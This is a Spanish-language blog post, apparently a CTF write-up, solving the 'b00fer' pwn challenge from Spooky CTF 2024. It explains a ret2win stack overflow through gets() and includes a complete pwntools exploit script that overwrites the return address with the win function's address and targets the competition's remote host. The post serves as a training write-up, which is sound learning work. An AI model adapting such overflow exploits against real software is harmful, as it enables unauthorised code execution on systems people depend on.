---
layout: post
title: b00fer Spooky CTF
comments: true
categories: [Pwn, Writeups, SploitFUN]
---

Este fin de semana he tenido la oportunidad de participar con mi equipo [Caliphal Hounds](https://ctftime.org/team/225933) en el [Spooky CTF 2024](https://ctftime.org/event/2516/). Como competición, bastante entretenida, aunque el nivel de los retos fue bastante bajo.

Por suerte tuvimos cuatro ejercicios de PWN, aunque como digo muy flojitos. En mi caso únicamente pude estar un par de horas y resolví 2, aunque del otro no creo que llegue a subir writeup siquiera.

![Image]({{ site.baseurl }}/images/posts/2024-10-28-spooky-ctf-2024.png)

# Overview

Se nos da un binario de 64 bits con únicamente el bit NX como protección. Además hace uso de la función `gets` para recibir un input del usuario. Analizando el código, vemos que existe una función `win`, que nos da la flag.

```
    Arch:     amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Un *ret2win* de manual.

# Explotación

Debemos encontrar el offset hasta el *RIP* y llenarlo con la dirección de la función `win`.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

exe = context.binary = ELF(args.EXE or 'B00fer')

def start():
    if args.REMOTE:
        return remote("b00fer.niccgetsspooky.xyz", 9001)
    else:
        return process()

offset = 40
win = p64(0x401227)

io = start()

payload = offset*b"A"
payload += win

log.info(payload)

io.sendlineafter("flag.", payload)

io.interactive()
```

Eso sería todo, hubiera sido más interesante incorporando parámetros a la función, como en el [último writeup que subí](({% post_url 2024-10-17-Pwn-UGR-CTF %})), ó incluso añadir alguna restricción como un Canary. Aún así contento con la mejora general del equipo.